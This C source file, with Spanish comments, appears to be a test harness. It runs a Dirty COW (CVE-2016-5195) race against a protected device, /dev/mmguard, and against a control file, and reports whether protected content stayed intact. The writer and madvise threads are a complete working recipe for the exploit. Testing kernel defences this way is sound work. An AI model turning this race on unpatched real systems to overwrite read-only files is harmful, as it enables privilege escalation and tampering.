/*
 * racer.c: ataque de carrera estilo Dirty COW (CVE-2016-5195) contra una región mapeada.
 *
 * Receta clásica del exploit, con tres hilos sobre un mapa PRIVADO de solo lectura:
 *   hilo A: pwrite() sobre /proc/self/mem en la dirección del mapa (escritura con FOLL_FORCE);
 *   hilo B: madvise(MADV_DONTNEED) en bucle (descarta la página COW privada en el peor momento);
 *   hilo C (principal): lee el mapa y comprueba que el contenido sigue siendo el original.
 *
 *   racer vault <segundos> <prefijo-esperado>    ataca /dev/mmguard
 *   racer file  <ruta> <segundos> <prefijo>      CONTROL: archivo normal (el kernel actual lo mitiga)
 */
#include "mmg_util.h"

#include <pthread.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/resource.h>
#include <time.h>

static char *map;
static int memfd;
static volatile int stop;
static unsigned long w_ok, w_fail, madv_calls;
static size_t elen;      /* global: evita el aviso de longjmp (-Wclobbered) */

static void *writer(void *arg)
{
	const char evil[] = "HACKEADO-POR-DIRTYCOW";

	(void)arg;
	while (!stop) {
		if (pwrite(memfd, evil, sizeof(evil) - 1, (off_t)(uintptr_t)map) == (ssize_t)(sizeof(evil) - 1))
			w_ok++;
		else
			w_fail++;
	}
	return NULL;
}

static void *madviser(void *arg)
{
	(void)arg;
	while (!stop) {
		madvise(map, PG, MADV_DONTNEED);
		madv_calls++;
	}
	return NULL;
}

static sigjmp_buf jb;
static void on_sig(int s) { (void)s; siglongjmp(jb, 1); }

int main(int argc, char **argv)
{
	int is_vault = argc > 1 && !strcmp(argv[1], "vault");
	const char *path = is_vault ? NULL : (argc > 2 ? argv[2] : NULL);
	int secs = atoi(is_vault ? (argc > 2 ? argv[2] : "5") : (argc > 3 ? argv[3] : "5"));
	const char *exp = is_vault ? (argc > 3 ? argv[3] : SECRET_PREFIX) : (argc > 4 ? argv[4] : "");
	int fd = is_vault ? mmg_open(O_RDONLY) : open(path, O_RDONLY);
	pthread_t ta, tb;
	elen = strlen(exp);
	unsigned long reads = 0, mism = 0, sigs = 0;
	time_t t0;
	struct sigaction sa = { .sa_handler = on_sig };

	if (fd < 0) { perror("open"); return 2; }
	map = mmap(NULL, PG, PROT_READ, MAP_PRIVATE, fd, 0);   /* RO + privado: blanco del Dirty COW */
	if (map == MAP_FAILED) { perror("mmap"); return 2; }
	memfd = open("/proc/self/mem", O_RDWR);
	sigemptyset(&sa.sa_mask);
	sigaction(SIGBUS, &sa, NULL);
	sigaction(SIGSEGV, &sa, NULL);

	pthread_create(&ta, NULL, writer, NULL);
	pthread_create(&tb, NULL, madviser, NULL);
	t0 = time(NULL);
	while (time(NULL) - t0 < secs) {
		if (sigsetjmp(jb, 1) == 0) {
			volatile char c = map[0];   /* (re)provoca fallos mientras los otros hilos pelean */
			(void)c;
			reads++;
			if (memcmp((const void *)map, exp, elen))
				mism++;
		} else {
			sigs++;
		}
	}
	stop = 1;
	pthread_join(ta, NULL);
	pthread_join(tb, NULL);

	printf("[INFO] %s: %lu pwrite(/proc/self/mem) exitosos, %lu fallidos, %lu madvise(DONTNEED), %lu lecturas, "
	       "%lu veces el mapa mostro contenido distinto, %lu senales\n",
	       is_vault ? "vault" : "control", w_ok, w_fail, madv_calls, reads, mism, sigs);

	if (is_vault) {
		/* Verificación independiente: una sesión nueva debe ver el contenido original. */
		int fd2 = mmg_open(O_RDONLY);
		char *q = mmap(NULL, PG, PROT_READ, MAP_SHARED, fd2, 0);
		int intact = q != MAP_FAILED && !memcmp(q, exp, elen);

		VERDICT("dirtycow-vault", w_ok == 0 && mism == 0 && intact,
			"escrituras exitosas=%lu, desviaciones del contenido=%lu, sesion nueva ve el original=%s",
			w_ok, mism, intact ? "si" : "NO");
		return !(w_ok == 0 && mism == 0 && intact);
	} else {
		/* Control: el archivo en disco/page cache no debe haber cambiado aunque el mapa privado sí. */
		char buf[64] = {0};
		int fd3 = open(path, O_RDONLY);
		int intact;

		if (pread(fd3, buf, elen, 0) < 0)
			perror("pread");
		intact = !memcmp(buf, exp, elen);
		VERDICT("dirtycow-control", intact,
			"archivo normal: el mapa privado cambio %lu veces (COW legitimo) pero el ARCHIVO sigue intacto=%s "
			"(mitigacion del kernel actual: FOLL_COW eliminado, COW con refcount/anon_exclusive)",
			mism, intact ? "si" : "NO");
		return !intact;
	}
}
